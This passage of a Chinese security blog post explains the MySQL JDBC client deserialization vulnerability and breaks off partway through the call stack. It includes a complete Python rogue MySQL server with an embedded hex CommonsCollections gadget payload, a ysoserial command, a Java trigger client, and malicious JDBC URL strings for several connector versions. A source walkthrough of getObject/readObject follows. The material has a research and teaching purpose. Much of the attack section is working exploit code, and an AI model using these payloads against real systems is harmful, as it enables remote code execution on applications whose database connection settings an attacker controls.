title="漏洞原理"></a>漏洞原理</h3><p>如果攻击者能够控制JDBC连接设置项，那么就可以通过设置其指向恶意MySQL服务器进行ObjectInputStream.readObject()的反序列化攻击从而RCE。</p><p>具体点说，就是通过JDBC连接MySQL服务端时，会有几个内置的SQL查询语句要执行，其中两个查询的结果集在MySQL客户端被处理时会调用ObjectInputStream.readObject()进行反序列化操作。如果攻击者搭建恶意MySQL服务器来控制这两个查询的结果集，并且攻击者可以控制JDBC连接设置项，那么就能触发MySQL JDBC客户端反序列化漏洞。</p><p>可被利用的两条查询语句：</p><ul><li>SHOW SESSION STATUS</li><li>SHOW COLLATION</li></ul><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>恶意MySQL服务器搭建可参考：</p><ul><li><a href="https://github.com/fnmsd/MySQL_Fake_Server" target="_blank" rel="noopener">https://github.com/fnmsd/MySQL_Fake_Server</a></li><li><a href="https://github.com/rmb122/rogue_mysql_server" target="_blank" rel="noopener">https://github.com/rmb122/rogue_mysql_server</a></li></ul><p>这里采用的是另一个脚本，使用Python3运行即可，只用Python自带的库：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">greeting_data=<span class="string">"4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400"</span></span><br><span class="line">response_ok_data=<span class="string">"0700000200000002000000"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">receive_data</span><span class="params">(conn)</span>:</span></span><br><span class="line">    data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">    print(<span class="string">"[*] Receiveing the package : &#123;&#125;"</span>.format(data))</span><br><span class="line">    <span class="keyword">return</span> str(data).lower()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_data</span><span class="params">(conn,data)</span>:</span></span><br><span class="line">    print(<span class="string">"[*] Sending the package : &#123;&#125;"</span>.format(data))</span><br><span class="line">    conn.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_payload_content</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#file文件的内容使用ysoserial生成的 使用规则：java -jar ysoserial [Gadget] [command] &gt; payload</span></span><br><span class="line">    file= <span class="string">r'payload'</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(file):</span><br><span class="line">        <span class="keyword">with</span> open(file, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            payload_content = str(binascii.b2a_hex(f.read()),encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">        print(<span class="string">"open successs"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"open false"</span>)</span><br><span class="line">        <span class="comment">#calc</span></span><br><span class="line">        payload_content=<span class="string">'aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878'</span></span><br><span class="line">    <span class="keyword">return</span> payload_content</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主要逻辑</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        conn, addr = sk.accept()</span><br><span class="line">        print(<span class="string">"Connection come from &#123;&#125;:&#123;&#125;"</span>.format(addr[<span class="number">0</span>],addr[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 1.先发送第一个 问候报文</span></span><br><span class="line">        send_data(conn,greeting_data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            <span class="comment"># 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok</span></span><br><span class="line">            receive_data(conn)</span><br><span class="line">            send_data(conn,response_ok_data)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#其他过程</span></span><br><span class="line">            data=receive_data(conn)</span><br><span class="line">            <span class="comment">#查询一些配置信息,其中会发送自己的 版本号</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"session.auto_increment_increment"</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload=<span class="string">'01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000'</span></span><br><span class="line">                send_data(conn,_payload)</span><br><span class="line">                data=receive_data(conn)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">"show warnings"</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload = <span class="string">'01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000'</span></span><br><span class="line">                send_data(conn, _payload)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"set names"</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"set character_set_results"</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"show session status"</span> <span class="keyword">in</span> data:</span><br><span class="line">                mysql_data = <span class="string">'0100000102'</span></span><br><span class="line">                mysql_data += <span class="string">'1a000002036465660001630163016301630c3f00ffff0000fc9000000000'</span></span><br><span class="line">                mysql_data += <span class="string">'1a000003036465660001630163016301630c3f00ffff0000fc9000000000'</span></span><br><span class="line">                <span class="comment"># 为什么我加了EOF Packet 就无法正常运行呢？？</span></span><br><span class="line">                <span class="comment"># 获取payload</span></span><br><span class="line">                payload_content=get_payload_content()</span><br><span class="line">                <span class="comment"># 计算payload长度</span></span><br><span class="line">                payload_length = str(hex(len(payload_content)//<span class="number">2</span>)).replace(<span class="string">'0x'</span>, <span class="string">''</span>).zfill(<span class="number">4</span>)</span><br><span class="line">                payload_length_hex = payload_length[<span class="number">2</span>:<span class="number">4</span>] + payload_length[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                <span class="comment"># 计算数据包长度</span></span><br><span class="line">                data_len = str(hex(len(payload_content)//<span class="number">2</span> + <span class="number">4</span>)).replace(<span class="string">'0x'</span>, <span class="string">''</span>).zfill(<span class="number">6</span>)</span><br><span class="line">                data_len_hex = data_len[<span class="number">4</span>:<span class="number">6</span>] + data_len[<span class="number">2</span>:<span class="number">4</span>] + data_len[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                mysql_data += data_len_hex + <span class="string">'04'</span> + <span class="string">'fbfc'</span>+ payload_length_hex</span><br><span class="line">                mysql_data += str(payload_content)</span><br><span class="line">                mysql_data += <span class="string">'07000005fe000022000100'</span></span><br><span class="line">                send_data(conn, mysql_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"show warnings"</span> <span class="keyword">in</span> data:</span><br><span class="line">                payload = <span class="string">'01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000'</span></span><br><span class="line">                send_data(conn, payload)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    HOST =<span class="string">'0.0.0.0'</span></span><br><span class="line">    PORT = <span class="number">3306</span></span><br><span class="line"></span><br><span class="line">    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment">#当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间</span></span><br><span class="line">    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    sk.bind((HOST, PORT))</span><br><span class="line">    sk.listen(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"start fake mysql server listening on &#123;&#125;:&#123;&#125;"</span>.format(HOST,PORT))</span><br><span class="line"></span><br><span class="line">    run()</span><br></pre></td></tr></table></figure><p>Demo代码，假设JDBC连接地址可控，并在环境中添加mysql-connector-java-8.0.13和commons-collections-3.2.1依赖：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class.forName(<span class="string">"com.mysql.jdbc.Driver"</span>);</span><br><span class="line">        String jdbc_url = <span class="string">"jdbc:mysql://x.x.x.x:3306/test?"</span> +</span><br><span class="line">                <span class="string">"autoDeserialize=true"</span> +</span><br><span class="line">                <span class="string">"&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor"</span>;</span><br><span class="line">        Connection con = DriverManager.getConnection(jdbc_url, <span class="string">"root"</span>, <span class="string">"root"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时JDBC连接设置为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li>queryInterceptors：一个逗号分割的Class列表（实现了com.mysql.cj.interceptors.QueryInterceptor接口的类），在Query”之间”进行执行来影响结果。（效果上来看是在Query执行前后各插入一次操作）；</li><li>autoDeserialize：自动检测与反序列化存在BLOB字段中的对象；</li></ul><p>先使用ysoserial生成CC7的payload，然后运行恶意MySQL服务器进行监听：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 calc &gt; payload</span><br><span class="line">python3 evil_mysql.py</span><br></pre></td></tr></table></figure><p>运行成功触发：</p><p><img src="/2021/04/23/MySQL-JDBC反序列化漏洞/1.png" alt=""></p><p>看到恶意MySQL服务是有具体的接受发送报文信息的：</p><p><img src="/2021/04/23/MySQL-JDBC反序列化漏洞/2.png" alt=""></p><h3 id="各种payload小结"><a href="#各种payload小结" class="headerlink" title="各种payload小结"></a>各种payload小结</h3><h4 id="ServerStatusDiffInterceptor触发点"><a href="#ServerStatusDiffInterceptor触发点" class="headerlink" title="ServerStatusDiffInterceptor触发点"></a>ServerStatusDiffInterceptor触发点</h4><h5 id="8-x"><a href="#8-x" class="headerlink" title="8.x"></a>8.x</h5><p>如上述Demo：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</span><br></pre></td></tr></table></figure><h5 id="6-x"><a href="#6-x" class="headerlink" title="6.x"></a>6.x</h5><p>属性名不同，queryInterceptors换为statementInterceptors：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</span><br></pre></td></tr></table></figure><h5 id="gt-5-1-11"><a href="#gt-5-1-11" class="headerlink" title="&gt;=5.1.11"></a>&gt;=5.1.11</h5><p>包名中没有cj：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor</span><br></pre></td></tr></table></figure><h5 id="5-x-lt-5-1-10"><a href="#5-x-lt-5-1-10" class="headerlink" title="5.x &lt;= 5.1.10"></a>5.x &lt;= 5.1.10</h5><p>同上，但需要连接后执行查询。</p><h4 id="detectCustomCollations触发点"><a href="#detectCustomCollations触发点" class="headerlink" title="detectCustomCollations触发点"></a>detectCustomCollations触发点</h4><h5 id="5-1-29-5-1-40"><a href="#5-1-29-5-1-40" class="headerlink" title="5.1.29 - 5.1.40"></a>5.1.29 - 5.1.40</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql://x.x.x.x:3306/test?detectCustomCollations=true&amp;autoDeserialize=true</span><br></pre></td></tr></table></figure><h5 id="5-1-28-5-1-19"><a href="#5-1-28-5-1-19" class="headerlink" title="5.1.28 - 5.1.19"></a>5.1.28 - 5.1.19</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true</span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这里仅分析ServerStatusDiffInterceptor触发点的漏洞场景。</p><p>在前面的代码调试分析发现，在调用com.mysql.cj.jdbc中相关函数来连接恶意MySQL服务器时，会调用到com.mysql.cj.jdbc.result.ResultSetImpl.getObject()函数，而其中会调用readObject()函数执行反序列化操作，说明看注释：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">int</span> columnIndex)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    checkRowPos();</span><br><span class="line">    checkColumnBounds(columnIndex);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> columnIndexMinusOne = columnIndex - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// we can't completely rely on code below because primitives have default values for null (e.g. int-&gt;0)</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.thisRow.getNull(columnIndexMinusOne)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Field field = <span class="keyword">this</span>.columnDefinition.getFields()[columnIndexMinusOne];</span><br><span class="line">    <span class="keyword">switch</span> (field.getMysqlType()) &#123;</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> BINARY:</span><br><span class="line">        <span class="keyword">case</span> VARBINARY:</span><br><span class="line">        <span class="keyword">case</span> TINYBLOB:</span><br><span class="line">        <span class="keyword">case</span> MEDIUMBLOB:</span><br><span class="line">        <span class="keyword">case</span> LONGBLOB:</span><br><span class="line">        <span class="keyword">case</span> BLOB:</span><br><span class="line">            <span class="comment">// 判断是否为Binary或Blob格式数据</span></span><br><span class="line">            <span class="keyword">if</span> (field.isBinary() || field.isBlob()) &#123;</span><br><span class="line">                <span class="keyword">byte</span>[] data = getBytes(columnIndex);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 判断autoDeserialize属性值是否为true，是的话才能进入反序列化操作的代码逻辑</span></span><br><span class="line">                <span class="comment">// 这就是为啥设置JDBC连接时需要带上autoDeserialize=true的原因</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.connection.getPropertySet().getBooleanProperty(PropertyKey.autoDeserialize).getValue()) &#123;</span><br><span class="line">                    Object obj = data;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// -84和-19为序列化对象的前两个字节，即AC和ED</span></span><br><span class="line">                    <span class="keyword">if</span> ((data != <span class="keyword">null</span>) &amp;&amp; (data.length &gt;= <span class="number">2</span>)) &#123;</span><br><span class="line">                        <span class="keyword">if</span> ((data[<span class="number">0</span>] == -<span class="number">84</span>) &amp;&amp; (data[<span class="number">1</span>] == -<span class="number">19</span>)) &#123;</span><br><span class="line">                            <span class="comment">// Serialized object?</span></span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                ByteArrayInputStream bytesIn = <span class="keyword">new</span> ByteArrayInputStream(data);</span><br><span class="line">                                ObjectInputStream objIn = <span class="keyword">new</span> ObjectInputStream(bytesIn);</span><br><span class="line">                                obj = objIn.readObject();</span><br><span class="line">                                objIn.close();</span><br><span class="line">                                bytesIn.close();</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (ClassNotFoundException cnfe) &#123;</span><br><span class="line">                                <span class="keyword">throw</span> SQLError.createSQLException(Messages.getString(<span class="string">"ResultSet.Class_not_found___91"</span>) + cnfe.toString()</span><br><span class="line">                                        + Messages.getString(<span class="string">"ResultSet._while_reading_serialized_object_92"</span>), getExceptionInterceptor());</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">                                obj = data; <span class="comment">// not serialized?</span></span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">return</span> getString(columnIndex);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> obj;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> data;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> getBytes(columnIndex);</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面调试看下怎么调用到com.mysql.cj.jdbc.result.ResultSetImpl.getObject()函数的，只看关键点。</p><p>一开始是com.mysql.jdbc.Driver进行JDBC中的连接，其中会新建连接实例：</p><p><img src="/2021/04/23/MySQL-JDBC反序列化漏洞/3.png" alt=""></p><p>连接后，接着设置对应的查询拦截器，对应的值就是我们在JDBC中设置的ServerStatusDiffInterceptor：</p><p><img src="/2021/04/23/MySQL-JDBC反序列化漏洞/4.png" alt=""></p><p>往下，程序从MySQL服务端来初始化Properties并执行相关的SQL语句，其中判断如果查询拦截器不为空则调用查询拦截器的preProcess()函数：</p><p><img src="/2021/04/23/MySQL-JDBC反序列化漏洞/5.png" alt=""></p><p><img src="/2021/04/23/MySQL-JDBC反序列化漏洞/6.png" alt=""></p><p>跟进看到，会运行查询语句<code>SHOW SESSION STATUS</code>，然后调用ResultSetUtil.resultSetToMap()函数，该函数中就调用了触发反序列化漏洞的getObject()函数（注意columnIndex为2处才能走到反序列化的代码逻辑，因为为1则直接返回null）：</p><p><img src="/2021/04/23/MySQL-JDBC反序列化漏洞/7.png" alt=""></p><p><img src="/2021/04/23/MySQL-JDBC反序列化漏洞/8.png" alt=""></p><p>在调用getObject()函数中，判断MySQL的类型为BLOB后，就从MySQL服务端中获取对应的字节码数据：</p><p><img src="/2021/04/23/MySQL-JDBC反序列化漏洞/9.png" alt=""></p><p><img src="/2021/04/23/MySQL-JDBC反序列化漏洞/10.png" alt=""></p><p>从MySQL服务端获取到字节码数据后，判断autoDeserialize是否为true、字节码数据是否为序列化对象等，最后调用readObject()触发反序列化漏洞：</p><p><img src="/2021/04/23/MySQL-JDBC反序列化漏洞/11.png" alt=""></p><p>也就是说，当MySQL字段类型为BLOB时，会对数据进行反序列化操作，因此只要保证第1或第2字段为BLOB类型且存储了恶意序列化数据即可触发反序列化漏洞。</p><p>此时函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">getObject:1326, ResultSetImpl (com.mysql.cj.jdbc.result)</span><br><span class="line">resultSetToMap:46, ResultSetUtil (com.mysql.cj.jdbc.util)</span><br><span class="line">populateMapWithSessionStatusValues:87, ServerStatusDiffInterceptor (com.mysql.cj.jdbc.interceptors)</span><br><span class="line">preProcess:105, 